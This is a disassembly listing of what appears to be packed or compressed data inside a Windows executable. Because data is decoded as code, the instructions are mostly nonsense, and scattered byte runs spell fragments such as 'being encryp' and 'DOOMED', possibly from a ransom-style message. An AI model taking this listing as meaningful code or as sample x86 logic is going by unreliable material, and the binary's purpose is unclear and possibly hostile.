   14000e681:	dc 20                	fsubl  (%rax)
   14000e683:	62 65 69 6e 67       	(bad)
   14000e688:	20 65 6e             	and    %ah,0x6e(%rbp)
   14000e68b:	63 72 79             	movsxd 0x79(%rdx),%esi
   14000e68e:	70 ba                	jo     0x14000e64a
   14000e690:	96                   	xchg   %eax,%esi
   14000e691:	4b ee                	rex.WXB out %al,(%dx)
   14000e693:	74 65                	je     0x14000e6fa
   14000e695:	64 bf 19 5c 59 55    	fs mov $0x55595c19,%edi
   14000e69b:	70 de                	jo     0x14000e67b
   14000e69d:	a0 76 85 ec 6f 6e 61 	movabs 0x6470616e6fec8576,%al
   14000e6a4:	70 64 
   14000e6a6:	44 20 68 61          	and    %r13b,0x61(%rax)
   14000e6aa:	73 ee                	jae    0x14000e69a
   14000e6ac:	07                   	(bad)
   14000e6ad:	ed                   	in     (%dx),%eax
   14000e6ae:	ed                   	in     (%dx),%eax
   14000e6af:	64 5c                	fs pop %rsp
   14000e6b1:	20 73 74             	and    %dh,0x74(%rbx)
   14000e6b4:	6f                   	outsl  (%rsi),(%dx)
   14000e6b5:	84 6e 1f             	test   %ch,0x1f(%rsi)
   14000e6b8:	46                   	rex.RX
   14000e6b9:	41 54                	push   %r12
   14000e6bb:	b9 5b b3 4d a1       	mov    $0xa14db35b,%ecx
   14000e6c0:	42 84 2c 65 63 30 68 	test   %bpl,0x63683063(,%r12,2)
   14000e6c7:	63 
   14000e6c8:	06                   	(bad)
   14000e6c9:	72 75                	jb     0x14000e740
   14000e6cb:	c1 9b b5 73 9f 58 e0 	rcrl   $0xe0,0x589f73b5(%rbx)
   14000e6d2:	6e                   	outsb  (%rsi),(%dx)
   14000e6d3:	0c d2                	or     $0xd2,%al
   14000e6d5:	70 61                	jo     0x14000e738
   14000e6d7:	69 72 7f 87 ec 0f 3e 	imul   $0x3e0fec87,0x7f(%rdx),%esi
   14000e6de:	49 52                	rex.WB push %r10
   14000e6e0:	52                   	push   %rdx
   14000e6e1:	45                   	rex.RB
   14000e6e2:	4e 53                	rex.WRX push %rbx
   14000e6e4:	49                   	rex.WB
   14000e6e5:	42                   	rex.X
   14000e6e6:	4c                   	rex.WR
   14000e6e7:	45 6c                	rex.RB insb (%dx),(%rdi)
   14000e6e9:	8b dd                	mov    %ebp,%ebx
   14000e6eb:	dc 82 df ba 6d 61    	faddl  0x616dbadf(%rdx)
   14000e6f1:	67 1c 69             	addr32 sbb $0x69,%al
   14000e6f4:	73 e1                	jae    0x14000e6d7
   14000e6f6:	14 6e                	adc    $0x6e,%al
   14000e6f8:	65 6e                	outsb  %gs:(%rsi),(%dx)
   14000e6fa:	25 68 16 0a 0b       	and    $0xb0a1668,%eax
   14000e6ff:	b8 58 54 79 98       	mov    $0x98795458,%eax
   14000e704:	48 f6 0a d9          	rex.W testb $0xd9,(%rdx)
   14000e708:	20 6f b8             	and    %ch,-0x48(%rdi)
   14000e70b:	16                   	(bad)
   14000e70c:	58                   	pop    %rax
   14000e70d:	7d a4                	jge    0x14000e6b3
   14000e70f:	09 16                	or     %edx,(%rsi)
   14000e711:	1e                   	(bad)
   14000e712:	76 65                	jbe    0x14000e779
   14000e714:	21 64 05 64          	and    %esp,0x64(%rbp,%rax,1)
   14000e718:	00 5b 70             	add    %bl,0x70(%rbx)
   14000e71b:	70 42                	jo     0x14000e75f
   14000e71d:	a5                   	movsl  (%rsi),(%rdi)
   14000e71e:	4e                   	rex.WRX
   14000e71f:	4f e8 45 89 6a 60    	rex.WRXB call 0x1a06b706a
   14000e725:	d2 bb 76 6d 70 75    	sarb   %cl,0x75706d76(%rbx)
   14000e72b:	cc                   	int3
   14000e72c:	72 bf                	jb     0x14000e6ed
   14000e72e:	6e                   	outsb  (%rsi),(%dx)
   14000e72f:	6f                   	outsl  (%rsi),(%dx)
   14000e730:	77 20                	ja     0x14000e752
   14000e732:	e6 68                	out    %al,$0x68
   14000e734:	6e                   	outsb  (%rsi),(%dx)
   14000e735:	43 f6 00 73          	rex.XB testb $0x73,(%r8)
   14000e739:	bf 8e 52 4d 65       	mov    $0x654d528e,%edi
   14000e73e:	56                   	push   %rsi
   14000e73f:	48 60                	rex.W (bad)
   14000e741:	d0 39                	sarb   $1,(%rcx)
   14000e743:	6c                   	insb   (%dx),(%rdi)
   14000e744:	22 64 77 2b          	and    0x2b(%rdi,%rsi,2),%ah
   14000e748:	5f                   	pop    %rdi
   14000e749:	6f                   	outsl  (%rsi),(%dx)
   14000e74a:	07                   	(bad)
   14000e74b:	f6 5b 82             	negb   -0x7e(%rbx)
   14000e74e:	c0 49 45 c0          	rorb   $0xc0,0x45(%rcx)
   14000e752:	44                   	rex.R
   14000e753:	4f                   	rex.WRXB
   14000e754:	4f                   	rex.WRXB
   14000e755:	4d                   	rex.WRB
   14000e756:	45                   	rex.RB
   14000e757:	44 5a                	rex.R pop %rdx
   14000e759:	ad                   	lods   (%rsi),%eax
   14000e75a:	41 70 c3             	rex.B jo 0x14000e720
   14000e75d:	4e 6f                	rex.WRX outsl (%rsi),(%dx)
   14000e75f:	6e                   	outsb  (%rsi),(%dx)
   14000e760:	73 63                	jae    0x14000e7c5
   14000e762:	61                   	(bad)
   14000e763:	5e                   	pop    %rsi
   14000e764:	9c                   	pushf
   14000e765:	72 5e                	jb     0x14000e7c5
   14000e767:	20 60 50             	and    %ah,0x50(%rax)
   14000e76a:	d0 de                	rcr    $1,%dh
   14000e76c:	74 68                	je     0x14000e7d6
   14000e76e:	b8 64 22 74 f2       	mov    $0xf2742264,%eax
   14000e773:	63 39                	movsxd (%rcx),%edi
   14000e775:	6b 57 da 50          	imul   $0x50,-0x26(%rdi),%edx
   14000e779:	6e                   	outsb  (%rsi),(%dx)
   14000e77a:	4e 8c 48 49          	rex.WRX mov %cs,0x49(%rax)
   14000e77e:	fd                   	std
   14000e77f:	5a                   	pop    %rdx
   14000e780:	43 a4                	rex.XB movsb (%rsi),(%rdi)
   14000e782:	e9 4e 70 a4 1b       	jmp    0x15ba557d5
   14000e787:	e1 77                	loope  0x14000e800
   14000e789:	69 70 b4 7f b0 15 00 	imul   $0x15b07f,-0x4c(%rax),%esi
   14000e790:	70 76                	jo     0x14000e808
   14000e792:	67 72 17             	addr32 jb 0x14000e7ac
   14000e795:	48                   	rex.W
   14000e796:	45                   	rex.RB
   14000e797:	4c                   	rex.WR
   14000e798:	4c                   	rex.WR
   14000e799:	4f 50                	rex.WRXB push %r8
   14000e79b:	49 38 d4             	rex.WB cmp %dl,%r12b
   14000e79e:	97                   	xchg   %eax,%edi
   14000e79f:	56                   	push   %rsi
   14000e7a0:	8a 57 4e             	mov    0x4e(%rdi),%dl
   14000e7a3:	57                   	push   %rdi
   14000e7a4:	00 55 2d             	add    %dl,0x2d(%rbp)
   14000e7a7:	51                   	push   %rcx
   14000e7a8:	7c 30                	jl     0x14000e7da
   14000e7aa:	3c 98                	cmp    $0x98,%al
   14000e7ac:	57                   	push   %rdi
   14000e7ad:	20 2d ab 00 52 c1    	and    %ch,-0x3eadff55(%rip)        # 0x10152e85e
   14000e7b3:	c5 02 6b             	(bad)
   14000e7b6:	c0 53 40 c3          	rclb   $0xc3,0x40(%rbx)
   14000e7ba:	3b 00                	cmp    (%rax),%eax
   14000e7bc:	b0 49                	mov    $0x49,%al
   14000e7be:	82                   	(bad)
   14000e7bf:	c1 67 6c 1e          	shll   $0x1e,0x6c(%rdi)
   14000e7c3:	74 76                	je     0x14000e83b
   14000e7c5:	65 0e                	gs (bad)
   14000e7c7:	5f                   	pop    %rdi
   14000e7c8:	2c d8                	sub    $0xd8,%al
   14000e7ca:	dd 0e                	fisttpll (%rsi)
   14000e7cc:	50                   	push   %rax
   14000e7cd:	4f fa                	rex.WRXB cli
   14000e7cf:	59                   	pop    %rcx
   14000e7d0:	50                   	push   %rax
   14000e7d1:	53                   	push   %rbx
   14000e7d2:	db e4                	fnsetpm(287 only)
   14000e7d4:	50                   	push   %rax
   14000e7d5:	d8 df                	fcomp  %st(7)
   14000e7d7:	61                   	(bad)
   14000e7d8:	79 44                	jns    0x14000e81e
   14000e7da:	6f                   	outsl  (%rsi),(%dx)
   14000e7db:	64 62 79 4a 50 19    	(bad)
   14000e7e1:	05 57 d1 12 21       	add    $0x2112d157,%eax
   14000e7e6:	4e                   	rex.WRX
   14000e7e7:	4f 1e                	rex.WRXB (bad)
   14000e7e9:	49 d8 5f 10          	rex.WB fcomps 0x10(%r15)
   14000e7ed:	0c 06                	or     $0x6,%al
   14000e7ef:	82                   	(bad)
   14000e7f0:	ba a0 ea c0 03       	mov    $0x3c0eaa0,%edx
   14000e7f5:	0e                   	(bad)
   14000e7f6:	e7 b0                	out    %eax,$0xb0
   14000e7f8:	d8 cb                	fmul   %st(3),%st
   14000e7fa:	56                   	push   %rsi
   14000e7fb:	77 ce                	ja     0x14000e7cb
   14000e7fd:	60                   	(bad)
   14000e7fe:	b6 75                	mov    $0x75,%dh
   14000e800:	10 58 42             	adc    %bl,0x42(%rax)
   14000e803:	4e                   	rex.WRX
   14000e804:	43                   	rex.XB
   14000e805:	4b 54                	rex.WXB push %r12
   14000e807:	e9 04 2f b1 17       	jmp    0x157b21710
   14000e80c:	cd 56                	int    $0x56
   14000e80e:	40                   	rex
   14000e80f:	65 ce                	gs (bad)
   14000e811:	6f                   	outsl  (%rsi),(%dx)
   14000e812:	66 a7                	cmpsw  (%rdi),(%rsi)
   14000e814:	ff 84 a3 1d 0c 0f 42 	incl   0x420f0c1d(%rbx,%riz,4)
   14000e81b:	0a 53 3f             	or     0x3f(%rbx),%dl
   14000e81e:	a0 47 7b 38 4a 04 69 	movabs 0x610e69044a387b47,%al
   14000e825:	0e 61 
   14000e827:	f5                   	cmc
   14000e828:	44 28 0e             	sub    %r9b,(%rsi)
   14000e82b:	c7                   	(bad)
   14000e82c:	ad                   	lods   (%rsi),%eax
   14000e82d:	b6 4e                	mov    $0x4e,%dh
   14000e82f:	49 50                	rex.WB push %r8
   14000e831:	07                   	(bad)
   14000e832:	20 68 25             	and    %ch,0x25(%rax)
   14000e835:	4d f4                	rex.WRB hlt
   14000e837:	70 47                	jo     0x14000e880
   14000e839:	41                   	rex.B
   14000e83a:	64 84 63 51          	test   %ah,%fs:0x51(%rbx)
   14000e83e:	41 8a d6             	mov    %r14b,%dl
   14000e841:	2e 16                	cs (bad)
   14000e843:	d0 53 53             	rclb   $1,0x53(%rbx)
   14000e846:	0d 3c 74 e6 6e       	or     $0x6ee6743c,%eax
   14000e84b:	0d e8 a9 1c 0b       	or     $0xb1ca9e8,%eax
   14000e850:	1d 15 55 38 35       	sbb    $0x35385515,%eax
   14000e855:	68 3a 6b 8f 65       	push   $0x658f6b3a
   14000e85a:	82                   	(bad)
   14000e85b:	54                   	push   %rsp
   14000e85c:	a7                   	cmpsl  (%rdi),(%rsi)
   14000e85d:	8e 00                	mov    (%rax),%es
   14000e85f:	4b d4                	rex.WXB (bad)
   14000e861:	a3 53 ee 66 06 7e 4f 	movabs %eax,0x454c4f7e0666ee53
   14000e868:	4c 45 
   14000e86a:	c9                   	leave
   14000e86b:	43 d8 c8             	rex.XB fmul %st(0),%st
   14000e86e:	ec                   	in     (%dx),%al
   14000e86f:	16                   	(bad)
   14000e870:	86 16                	xchg   %dl,(%rsi)
   14000e872:	28 64 fe bc          	sub    %ah,-0x44(%rsi,%rdi,8)
   14000e876:	a7                   	cmpsl  (%rdi),(%rsi)
   14000e877:	16                   	(bad)
   14000e878:	3c 55                	cmp    $0x55,%al
   14000e87a:	2e 53                	cs push %rbx
   14000e87c:	09 1f                	or     %ebx,(%rdi)
   14000e87e:	61                   	(bad)
   14000e87f:	0a 86 d9 51 00 e8    	or     -0x17ffae27(%rsi),%al
   14000e885:	03 21                	add    (%rcx),%esp
   14000e887:	1c 72                	sbb    $0x72,%al
   14000e889:	61                   	(bad)
   14000e88a:	81 59 1b 6c 6c 00 ef 	sbbl   $0xef006c6c,0x1b(%rcx)
   14000e891:	1a b3 59 93 41 40    	sbb    0x40419359(%rbx),%dh
   14000e897:	36 d2 64 19 77       	ss shlb %cl,0x77(%rcx,%rbx,1)
   14000e89c:	42 1a 56 67          	rex.X sbb 0x67(%rsi),%dl
   14000e8a0:	2b 32                	sub    (%rdx),%esi
   14000e8a2:	15 8a 6c 63 13       	adc    $0x13636c8a,%eax
   14000e8a7:	6d                   	insl   (%dx),(%rdi)
   14000e8a8:	73 12                	jae    0x14000e8bc
   14000e8aa:	aa                   	stos   %al,(%rdi)
   14000e8ab:	68 bb 19 b0 2d       	push   $0x2db019bb
   14000e8b0:	6d                   	insl   (%dx),(%rdi)
   14000e8b1:	55                   	push   %rbp
   14000e8b2:	da 77 e5             	fidivl -0x1b(%rdi)
   14000e8b5:	54                   	push   %rsp
   14000e8b6:	76 d6                	jbe    0x14000e88e
   14000e8b8:	ce                   	(bad)
   14000e8b9:	ce                   	(bad)
   14000e8ba:	1f                   	(bad)
   14000e8bb:	38 de                	cmp    %bl,%dh
   14000e8bd:	de 91 1d d8 19 b2    	ficoms -0x4de627e3(%rcx)
   14000e8c3:	73 6b                	jae    0x14000e930
   14000e8c5:	6d                   	insl   (%dx),(%rdi)
   14000e8c6:	67 c3                	addr32 ret
   14000e8c8:	6d                   	insl   (%dx),(%rdi)
   14000e8c9:	6d                   	insl   (%dx),(%rdi)
   14000e8ca:	b7 b7                	mov    $0xb7,%bh
   14000e8cc:	97                   	xchg   %eax,%edi
   14000e8cd:	da 91 64 72 65 19    	ficoml 0x19657264(%rcx)
   14000e8d3:	73 66                	jae    0x14000e93b
   14000e8d5:	11 63 59             	adc    %esp,0x59(%rbx)
   14000e8d8:	bb ca ec 68 6b       	mov    $0x6b68ecca,%ebx
   14000e8dd:	64 5a                	fs pop %rdx
   14000e8df:	17                   	(bad)
   14000e8e0:	24 6b                	and    $0x6b,%al
   14000e8e2:	d8 72 8b             	fdivs  -0x75(%rdx)
   14000e8e5:	5e                   	pop    %rsi
   14000e8e6:	5c                   	pop    %rsp
   14000e8e7:	d1 ad 00 1d 49 f7    	shrl   $1,-0x8b6e300(%rbp)
   14000e8ed:	46 7e 6c             	rex.RX jle 0x14000e95c
   14000e8f0:	86 01                	xchg   %al,(%rcx)
   14000e8f2:	6a 92                	push   $0xffffffffffffff92
   14000e8f4:	96                   	xchg   %eax,%esi
   14000e8f5:	63 75 73             	movsxd 0x73(%rbp),%esi
   14000e8f8:	4f ac                	rex.WRXB lods (%rsi),%al
   14000e8fa:	57                   	push   %rdi
   14000e8fb:	61                   	(bad)
   14000e8fc:	b9 07 f6 fa 68       	mov    $0x68faf607,%ecx
   14000e901:	fb                   	sti
   14000e902:	06                   	(bad)
   14000e903:	dc 6a 7f             	fsubrl 0x7f(%rdx)
   14000e906:	15 65 62 75 67       	adc    $0x67756265,%eax
   14000e90b:	58                   	pop    %rax
   14000e90c:	72 5f                	jb     0x14000e96d
   14000e90e:	44 04 9b             	rex.R add $0x9b,%al
   14000e911:	b3 d3                	mov    $0xd3,%bl
   14000e913:	01 1f                	add    %ebx,(%rdi)
   14000e915:	a3 08 46 2f 1a 6c 7a 	movabs %eax,0x11237a6c1a2f4608
   14000e91c:	23 11 
   14000e91e:	3c 44                	cmp    $0x44,%al
   14000e920:	04 1f                	add    $0x1f,%al
   14000e922:	6f                   	outsl  (%rsi),(%dx)
   14000e923:	73 6b                	jae    0x14000e990
   14000e925:	17                   	(bad)
   14000e926:	f6 b4 08 06 0f 41 e1 	divb   -0x1ebef0fa(%rax,%rcx,1)
   14000e92d:	ad                   	lods   (%rsi),%eax
   14000e92e:	e1 0a                	loope  0x14000e93a
   14000e930:	1b 43 a0             	sbb    -0x60(%rbx),%eax
   14000e933:	e8 6f 6c 53 e4       	call   0x1245455a7
   14000e938:	5c                   	pop    %rsp
   14000e939:	15 5c 7d e5 f8       	adc    $0xf8e57d5c,%eax
   14000e93e:	5c                   	pop    %rsp
   14000e93f:	4b                   	rex.WXB
   14000e940:	65 79 14             	gs jns 0x14000e957
   14000e943:	4a 20 4c 61 f4       	rex.WX and %cl,-0xc(%rcx,%r12,2)
   14000e948:	74 95                	je     0x14000e8df
   14000e94a:	ea                   	(bad)
   14000e94b:	75 01                	jne    0x14000e94e
   14000e94d:	63 6a c6             	movsxd -0x3a(%rdx),%ebp
   14000e950:	0a eb                	or     %bl,%ch
   14000e952:	5e                   	pop    %rsi
   14000e953:	0d 7b 20 4d 61       	or     $0x614d207b,%eax
   14000e958:	70 d5                	jo     0x14000e92f
   14000e95a:	42 0e                	rex.X (bad)
   14000e95c:	52                   	push   %rdx
   14000e95d:	59                   	pop    %rcx
   14000e95e:	dd 30                	fnsave (%rax)
   14000e960:	01 66 a6             	add    %esp,-0x5a(%rsi)
   14000e963:	69 43 33 15 35 a6 0f 	imul   $0xfa63515,0x33(%rbx),%eax
   14000e96a:	43                   	rex.XB
   14000e96b:	42 b0 c1             	rex.X mov $0xc1,%al
   14000e96e:	45 01 43 2f          	add    %r8d,0x2f(%r11)
   14000e972:	00 0c 2a             	add    %cl,(%rdx,%rbp,1)
   14000e975:	00 5f b1             	add    %bl,-0x4f(%rdi)
   14000e978:	10 5b c0             	adc    %bl,-0x40(%rbx)
   14000e97b:	3d df 9d 62 1f       	cmp    $0x1f629ddf,%eax
   14000e980:	2d b5 f1 c1 43       	sub    $0x43c1f1b5,%eax
   14000e985:	4d                   	rex.WRB
   14000e986:	44 b9 00 02 44 10    	rex.R mov $0x10440200,%ecx
   14000e98c:	9f                   	lahf
   14000e98d:	2a 00                	sub    (%rax),%al
   14000e98f:	97                   	xchg   %eax,%edi
   14000e990:	6a fd                	push   $0xfffffffffffffffd
   14000e992:	01 05 02 08 b4 23    	add    %eax,0x23b40802(%rip)        # 0x163b4f19a
   14000e998:	00 7f 40             	add    %bh,0x40(%rdi)
   14000e99b:	01 64 a9 11          	add    %esp,0x11(%rcx,%rbp,4)
   14000e99f:	01 1d 01 e8 02 16    	add    %ebx,0x1602e801(%rip)        # 0x15603d1a6
   14000e9a5:	9d                   	popf
   14000e9a6:	74 01                	je     0x14000e9a9
   14000e9a8:	ab                   	stos   %eax,(%rdi)
   14000e9a9:	90                   	nop
   14000e9aa:	6b 3b 36             	imul   $0x36,(%rbx),%edi
   14000e9ad:	00 2e                	add    %ch,(%rsi)
   14000e9af:	60                   	(bad)
   14000e9b0:	a3 47 5f c4 05 a4 a9 	movabs %eax,0xa9a405c45f47
   14000e9b7:	00 00 
   14000e9b9:	00 17                	add    %dl,(%rdi)
   14000e9bb:	6e                   	outsb  (%rsi),(%dx)
   14000e9bc:	a3 09 01 d2 4f 4f 4c 	movabs %eax,0x49f4c4f4fd20109
   14000e9c3:	9f 04 
   14000e9c5:	36 15 46 ae bc 4d    	ss adc $0x4dbcae46,%eax
   14000e9cb:	45 da bb 2a ec 19 b8 	rex.RB fidivrl -0x47e613d6(%r11)
   14000e9d2:	48 be 04 41 79 1f 6c 	movabs $0x5672306c1f794104,%rsi
   14000e9d9:	30 72 56 
   14000e9dc:	45                   	rex.RB
   14000e9dd:	46 8a 7f 0a          	rex.RX mov 0xa(%rdi),%r15b
   14000e9e1:	0a 49 a3             	or     -0x5d(%rcx),%cl
   14000e9e4:	13 18                	adc    (%rax),%ebx
   14000e9e6:	b4 54                	mov    $0x54,%ah
   14000e9e8:	20 49 ec             	and    %cl,-0x14(%rcx)
   14000e9eb:	f2 46 7b b6          	bnd rex.RX jnp 0x14000e9a5
   14000e9ef:	4a 98                	rex.WX cltq
   14000e9f1:	e4 3a                	in     $0x3a,%al
   14000e9f3:	cd 84                	int    $0x84
   14000e9f5:	f1                   	int1
   14000e9f6:	9a                   	(bad)
   14000e9f7:	81 18 d8 fd 4e 43    	sbbl   $0x434efdd8,(%rax)
   14000e9fd:	4c 55                	rex.WR push %rbp
   14000e9ff:	44 bb 0a 2d 47 b0    	rex.R mov $0xb0472d0a,%ebx
   14000ea05:	18 0d 66 c2 4a d8    	sbb    %cl,-0x27b53d9a(%rip)        # 0x1184bac71
   14000ea0b:	20 57 13             	and    %dl,0x13(%rdi)
   14000ea0e:	ae                   	scas   (%rdi),%al
   14000ea0f:	09 c2                	or     %eax,%edx
   14000ea11:	f7 76 2c             	divl   0x2c(%rsi)
   14000ea14:	53                   	push   %rbx
   14000ea15:	54                   	push   %rsp
   14000ea16:	60                   	(bad)
   14000ea17:	70 1d                	jo     0x14000ea36
   14000ea19:	c2 de 57             	ret    $0x57de
   14000ea1c:	36 45 31 93 4f 77 b6 	ss xor %r10d,-0x664988b1(%r11)
   14000ea23:	99 
   14000ea24:	60                   	(bad)
   14000ea25:	70 b3                	jo     0x14000e9da
   14000ea27:	06                   	(bad)
   14000ea28:	ee                   	out    %al,(%dx)
   14000ea29:	da 50 41             	ficoml 0x41(%rax)
   14000ea2c:	e6 c6                	out    %al,$0xc6
   14000ea2e:	84 df                	test   %bl,%bh
   14000ea30:	76 56                	jbe    0x14000ea88
   14000ea32:	bc 53 41 e7 4c       	mov    $0x4ce74153,%esp
   14000ea37:	4c d7                	rex.WR xlat (%rbx)
   14000ea39:	86 59 60             	xchg   %bl,0x60(%rcx)
   14000ea3c:	0d 6b 53 e3 51       	or     $0x51e3536b,%eax
   14000ea41:	50                   	push   %rax
   14000ea42:	90                   	nop
   14000ea43:	99                   	cltd
   14000ea44:	c3                   	ret
   14000ea45:	9a                   	(bad)
   14000ea46:	6d                   	insl   (%dx),(%rdi)
   14000ea47:	36 48 55             	ss rex.W push %rbp
   14000ea4a:	7c 50                	jl     0x14000ea9c
   14000ea4c:	44 3c a4             	rex.R cmp $0xa4,%al
   14000ea4f:	4e 55                	rex.WRX push %rbp
   14000ea51:	18 34 81             	sbb    %dh,(%rcx,%rax,4)
   14000ea54:	42 b4 d0             	rex.X mov $0xd0,%spl
   14000ea57:	5a                   	pop    %rdx
   14000ea58:	44                   	rex.R
   14000ea59:	3e 50                	ds push %rax
   14000ea5b:	66 06                	data16 (bad)
   14000ea5d:	db e0                	fneni(8087 only)
   14000ea5f:	2d 55 50 aa 3c       	sub    $0x3caa5055,%eax
   14000ea64:	4f 57                	rex.WRXB push %r15
   14000ea66:	0b 96 38 0c 06 1b    	or     0x1b060c38(%rsi),%edx
   14000ea6c:	6b 20 54             	imul   $0x54,(%rax),%esp
   14000ea6f:	71 32                	jno    0x14000eaa3
   14000ea71:	44 37                	rex.R (bad)
   14000ea73:	70 81                	jo     0x14000e9f6
   14000ea75:	6b 1f 45             	imul   $0x45,(%rdi),%ebx
   14000ea78:	46                   	rex.RX
   14000ea79:	46 e0 54             	rex.RX loopne 0x14000ead0
   14000ea7c:	55                   	push   %rbp
   14000ea7d:	00 4f 43             	add    %cl,0x43(%rdi)
   14000ea80:	4b 2b 31             	rex.WXB sub (%r9),%rsi
   14000ea83:	a8 78                	test   $0x78,%al
   14000ea85:	05 55 d8 52 ee       	add    $0xee52d855,%eax
   14000ea8a:	90                   	nop
   14000ea8b:	20 28                	and    %ch,(%rax)
   14000ea8d:	7b 3b                	jnp    0x14000eaca
   14000ea8f:	d8 6e 36             	fsubrs 0x36(%rsi)
   14000ea92:	52                   	push   %rdx
   14000ea93:	4c 2b 28             	sub    (%rax),%r13
   14000ea96:	54                   	push   %rsp
   14000ea97:	2b dc                	sub    %esp,%ebx
   14000ea99:	2c 5a                	sub    $0x5a,%al
   14000ea9b:	54                   	push   %rsp
   14000ea9c:	43                   	rex.XB
   14000ea9d:	2e 29 56 89          	cs sub %edx,-0x77(%rsi)
   14000eaa1:	23 68 83             	and    -0x7d(%rax),%ebp
   14000eaa4:	72 9a                	jb     0x14000ea40
   14000eaa6:	43 b5 53             	rex.XB mov $0x53,%r13b
   14000eaa9:	54                   	push   %rsp
   14000eaaa:	a4                   	movsb  (%rsi),(%rdi)
   14000eaab:	8a ec                	mov    %ah,%ch
   14000eaad:	10 b7 75 3e 53 78    	adc    %dh,0x78533e75(%rdi)
   14000eab3:	e1 ee                	loope  0x14000eaa3
   14000eab5:	16                   	(bad)
   14000eab6:	ba 47 45 6a 56       	mov    $0x566a4547,%edx
   14000eabb:	36 e2 83             	ss loop 0x14000ea41
   14000eabe:	74 dc                	je     0x14000ea9c
   14000eac0:	20 9e 6c 59 50 54    	and    %bl,0x5450596c(%rsi)
   14000eac6:	e9 cc b8 50 3c       	jmp    0x17c51a397
   14000eacb:	de 53 4f             	ficoms 0x4f(%rbx)
   14000eace:	73 fa                	jae    0x14000eaca
   14000ead0:	32 8f 30 3c 30 bb    	xor    -0x44cfc3d0(%rdi),%cl
   14000ead6:	37                   	(bad)
   14000ead7:	d2 5c 1a 54          	rcrb   %cl,0x54(%rdx,%rbx,1)
   14000eadb:	48 8f 43 c3          	rex.W pop -0x3d(%rbx)
   14000eadf:	c2 61 f3             	ret    $0xf361
   14000eae2:	04 0a                	add    $0xa,%al
   14000eae4:	55                   	push   %rbp
   14000eae5:	71 8c                	jno    0x14000ea73
   14000eae7:	35 6c ee 0a a7       	xor    $0xa70aee6c,%eax
   14000eaec:	52                   	push   %rdx
   14000eaed:	51                   	push   %rcx
   14000eaee:	55                   	push   %rbp
   14000eaef:	9a                   	(bad)
   14000eaf0:	45 3f                	rex.RB (bad)
   14000eaf2:	6d                   	insl   (%dx),(%rdi)
   14000eaf3:	f6 23                	mulb   (%rbx)
   14000eaf5:	74 f3                	je     0x14000eaea
   14000eaf7:	01 53 ee             	add    %edx,-0x12(%rbx)
   14000eafa:	1a 43 48             	sbb    0x48(%rbx),%al
   14000eafd:	60                   	(bad)
   14000eafe:	78 38                	js     0x14000eb38
   14000eb00:	83 c2 3e             	add    $0x3e,%edx
   14000eb03:	f1                   	int1
   14000eb04:	72 b2                	jb     0x14000eab8
   14000eb06:	5b                   	pop    %rbx
   14000eb07:	c7                   	(bad)
   14000eb08:	cd ee                	int    $0xee
   14000eb0a:	d2 68 0e             	shrb   %cl,0xe(%rax)
   14000eb0d:	5a                   	pop    %rdx
   14000eb0e:	55                   	push   %rbp
   14000eb0f:	45 3f                	rex.RB (bad)
   14000eb11:	ff 26                	jmp    *(%rsi)
   14000eb13:	c7                   	(bad)
   14000eb14:	8e c8                	mov    %eax,%cs
   14000eb16:	b6 10                	mov    $0x10,%dh
   14000eb18:	52                   	push   %rdx
   14000eb19:	4d 7b 0f             	rex.WRB jnp 0x14000eb2b
   14000eb1c:	54                   	push   %rsp
   14000eb1d:	55                   	push   %rbp
   14000eb1e:	cf                   	iret
   14000eb1f:	8e b4 02 c3 54 f6 4b 	mov    0x4bf654c3(%rdx,%rax,1),%?
   14000eb26:	4f fb                	rex.WRXB sti
   14000eb28:	ad                   	lods   (%rsi),%eax
   14000eb29:	99                   	cltd
   14000eb2a:	1d 8c a3 ea f6       	sbb    $0xf6eaa38c,%eax
   14000eb2f:	84 48 be             	test   %cl,-0x42(%rax)
   14000eb32:	43 1c 66             	rex.XB sbb $0x66,%al
   14000eb35:	d0 bd 45 c1 11 4c    	sarb   $1,0x4c11c145(%rbp)
   14000eb3b:	b3 1c                	mov    $0x1c,%bl
   14000eb3d:	d8 8e 0f 5c 33 6c    	fmuls  0x6c335c0f(%rsi)
   14000eb43:	57                   	push   %rdi
   14000eb44:	91                   	xchg   %eax,%ecx
   14000eb45:	c5 42 45             	(bad)
   14000eb48:	af                   	scas   (%rdi),%eax
   14000eb49:	c1 a3 c1 26 41 14 5c 	shll   $0x5c,0x144126c1(%rbx)
   14000eb50:	44 dd 29             	rex.R (bad) (%rcx)
   14000eb53:	04 a2                	add    $0xa2,%al
   14000eb55:	83 bd 28 da ae 9c ee 	cmpl   $0xffffffee,-0x635125d8(%rbp)
   14000eb5c:	8a b1 ad 52 2e 10    	mov    0x102e52ad(%rcx),%dh
   14000eb62:	45 29 75 15          	sub    %r14d,0x15(%r13)
   14000eb66:	44 5c                	rex.R pop %rsp
   14000eb68:	4c 11 8a 1c 9b 1d 86 	adc    %r9,-0x79e264e4(%rdx)
   14000eb6f:	4e 84 25 1a fb 22 45 	rex.WRX test %r12b,0x4522fb1a(%rip)        # 0x18523e690
   14000eb76:	53                   	push   %rbx
   14000eb77:	61                   	(bad)
   14000eb78:	6f                   	outsl  (%rsi),(%dx)
   14000eb79:	5f                   	pop    %rdi
   14000eb7a:	ab                   	stos   %eax,(%rdi)
   14000eb7b:	8f                   	(bad)
   14000eb7c:	b0 55                	mov    $0x55,%al
   14000eb7e:	d7                   	xlat   (%rbx)
   14000eb7f:	41 11 dc             	adc    %ebx,%r12d
   14000eb82:	f1                   	int1
   14000eb83:	52                   	push   %rdx
   14000eb84:	30 ba 46 d8 12 0f    	xor    %bh,0xf12d846(%rdx)
   14000eb8a:	41 16                	rex.B (bad)
   14000eb8c:	14 af                	adc    $0xaf,%al
   14000eb8e:	c2 93 81             	ret    $0x8193
   14000eb91:	41 d3 4f 8c          	rorl   %cl,-0x74(%r15)
   14000eb95:	25 28 af c3 e1       	and    $0xe1c3af28,%eax
   14000eb9a:	4c 60                	rex.WR (bad)
   14000eb9c:	22 8f e7 c6 ee 02    	and    0x2eec6e7(%rdi),%cl
   14000eba2:	7c 31                	jl     0x14000ebd5
   14000eba4:	bd 68 cc d4 39       	mov    $0x39d4cc68,%ebp
   14000eba9:	65 45                	gs rex.RB
   14000ebab:	44                   	rex.R
   14000ebac:	4d                   	rex.WRB
   14000ebad:	4c 71 b1             	rex.WR jno 0x14000eb61
   14000ebb0:	62                   	(bad)
   14000ebb1:	c8 52 45 67          	enter  $0x4552,$0x67
   14000ebb5:	e2 a4                	loop   0x14000eb5b
   14000ebb7:	15 c5 7f a8 24       	adc    $0x24a87fc5,%eax
   14000ebbc:	01 53 55             	add    %edx,0x55(%rbx)
   14000ebbf:	52                   	push   %rdx
   14000ebc0:	45 8f                	rex.RB (bad)
